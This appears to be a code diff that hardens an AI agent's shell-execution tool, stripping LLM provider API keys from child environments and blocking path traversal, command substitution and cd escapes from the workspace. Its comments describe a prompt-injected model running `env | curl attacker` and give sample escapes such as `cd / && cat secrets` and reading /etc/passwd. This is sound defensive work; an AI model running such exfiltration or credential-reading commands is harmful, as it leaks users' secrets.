@@ -1,6 +1,7 @@
-import { delimiter, resolve } from "node:path";
+import { delimiter, resolve, sep } from "node:path";
 import { platform } from "node:os";
 import { Tool } from "./base.js";
+import { PROVIDERS } from "../../providers/registry.js";
 
 const IS_WINDOWS = platform() === "win32";
 
@@ -19,8 +20,53 @@ const DENY_PATTERNS = [
 const MAX_TIMEOUT = 600;
 const MAX_OUTPUT = 10_000;
 
+/**
+ * Names of environment variables that carry tarantul's own LLM provider API
+ * keys (see providers/registry.ts). OpenAICompatProvider.setupEnv() writes
+ * these into process.env so the underlying SDK can read them — which means
+ * they're also present in process.env for anything ExecTool spawns. A model
+ * can be prompt-injected into running something like `env | curl attacker`,
+ * so these are stripped from the child's environment rather than trusting
+ * the shell guard below to catch every possible exfiltration command.
+ */
+const PROVIDER_SECRET_ENV_NAMES = new Set<string>();
+for (const p of PROVIDERS) {
+  if (p.envKey) PROVIDER_SECRET_ENV_NAMES.add(p.envKey);
+  for (const [name] of p.envExtras) PROVIDER_SECRET_ENV_NAMES.add(name);
+}
+
+function buildChildEnv(pathAppend: string): Record<string, string | undefined> {
+  const env: Record<string, string | undefined> = {};
+  for (const [key, value] of Object.entries(process.env)) {
+    if (PROVIDER_SECRET_ENV_NAMES.has(key)) continue;
+    env[key] = value;
+  }
+  if (pathAppend) {
+    env["PATH"] = (env["PATH"] ?? "") + delimiter + pathAppend;
+  }
+  return env;
+}
+
 function containsPathTraversal(cmd: string): boolean {
-  return cmd.includes("../") || cmd.includes("..\\");
+  // Matches ".." as a standalone path segment — bounded by whitespace/slash
+  // on both sides, or string start/end — catching `cd ..`, `cat ../secret`,
+  // `foo/../bar`, etc. The old `../`/`..\\` substring check missed bare
+  // `cd ..` (no trailing separator).
+  return /(?:^|[\s/\\])\.\.(?:$|[\s/\\])/.test(cmd);
+}
+
+function containsUnsafeSubstitution(cmd: string): boolean {
+  // Command/process substitution can construct a path at runtime that never
+  // appears as literal text in the command (e.g. a printf of escaped bytes
+  // spelling out "/etc/passwd"), which the static path scan below can never
+  // catch. Block it outright under workspace restriction rather than let it
+  // silently defeat that scan.
+  return /\$\(|`|<\(|>\(/.test(cmd);
+}
+
+/** True if `resolved` is `dirResolved` itself or strictly inside it. */
+function isWithinDir(resolved: string, dirResolved: string): boolean {
+  return resolved === dirResolved || resolved.startsWith(dirResolved + sep);
 }
 
 export class ExecTool extends Tool {
@@ -75,10 +121,7 @@ export class ExecTool extends Tool {
     const guardError = this.guardCommand(command, workingDir);
     if (guardError) return guardError;
 
-    const env = { ...process.env };
-    if (this.pathAppend) {
-      env["PATH"] = (env["PATH"] ?? "") + delimiter + this.pathAppend;
-    }
+    const env = buildChildEnv(this.pathAppend);
 
     const shellCmd = IS_WINDOWS ? ["cmd.exe", "/d", "/s", "/c", command] : ["sh", "-c", command];
 
@@ -154,6 +197,15 @@ export class ExecTool extends Tool {
     proc.kill();
   }
 
+  /**
+   * Best-effort safety guard, not a sandbox. This is a regex/text scan over
+   * a shell command string handed to `sh -c` — it can catch obvious literal
+   * escapes (quoted/absolute paths, `cd` out of the workspace, `..` traversal)
+   * but cannot statically resolve anything computed at runtime (variable
+   * expansion, `$()`/backtick output, base64/printf-encoded paths, etc.), so
+   * it's blocked outright rather than evaluated. If strict isolation matters,
+   * this needs an OS-level sandbox or a binary allow-list, not a deny-list.
+   */
   private guardCommand(command: string, cwd: string): string | null {
     const lower = command.toLowerCase();
 
@@ -173,12 +225,24 @@ export class ExecTool extends Tool {
       if (containsPathTraversal(command)) {
         return "Error: Command blocked by safety guard (path traversal detected)";
       }
+      if (containsUnsafeSubstitution(command)) {
+        return (
+          "Error: Command blocked by safety guard " +
+          "(command/process substitution is not allowed with workspace restriction enabled)"
+        );
+      }
 
       const cwdResolved = resolve(cwd);
-      for (const raw of this.extractAbsolutePaths(command)) {
+      const candidates = [...this.extractAbsolutePaths(command), ...this.extractCdTargets(command)];
+      for (const raw of candidates) {
         try {
-          const p = resolve(raw.trim().replace(/^~/, process.env["HOME"] ?? "~"));
-          if (!p.startsWith(cwdResolved)) {
+          const trimmed = raw.trim().replace(/^~/, process.env["HOME"] ?? "~");
+          // Resolve relative to the command's own cwd, not this process's —
+          // `cd subdir` needs to land inside the target working directory.
+          // Absolute candidates are unaffected: path.resolve() ignores prior
+          // args once it hits an absolute one.
+          const p = resolve(cwdResolved, trimmed);
+          if (!isWithinDir(p, cwdResolved)) {
             return "Error: Command blocked by safety guard (path outside working dir)";
           }
         } catch {
@@ -191,8 +255,22 @@ export class ExecTool extends Tool {
   }
 
   private extractAbsolutePaths(command: string): string[] {
-    const posix = [...(command.match(/(?:^|[\s|>'"'])(\/[^\s"'>;|<]+)/g) ?? [])];
-    const home = [...(command.match(/(?:^|[\s|>'"'])(~[^\s"'>;|<]*)/g) ?? [])];
+    // Use the capture group, not the full match — the boundary character
+    // class matches a leading quote/space that must NOT end up in the
+    // extracted path, or a quoted path like `'/etc/passwd'` resolves as
+    // relative-to-cwd (starting with `'`) and silently passes the check
+    // above instead of being recognized as `/etc/passwd`.
+    const posix = [...command.matchAll(/(?:^|[\s|>"'])(\/[^\s"'>;|<]+)/g)].map((m) => m[1]!);
+    const home = [...command.matchAll(/(?:^|[\s|>"'])(~[^\s"'>;|<]*)/g)].map((m) => m[1]!);
     return [...posix, ...home].map((s) => s.trim());
+  }
+
+  private extractCdTargets(command: string): string[] {
+    // Catches `cd <path>` at the start of the command or after a chain
+    // operator (`;`, `&&`, `||`, `|`) — the concrete `cd / && cat secrets`
+    // escape, which only checking absolute-path tokens never covers.
+    return [...command.matchAll(/(?:^|[;&|]\s*)cd\s+(\S+)/g)].map((m) =>
+      m[1]!.replace(/^['"]|['"]$/g, ""),
+    );
   }
 }
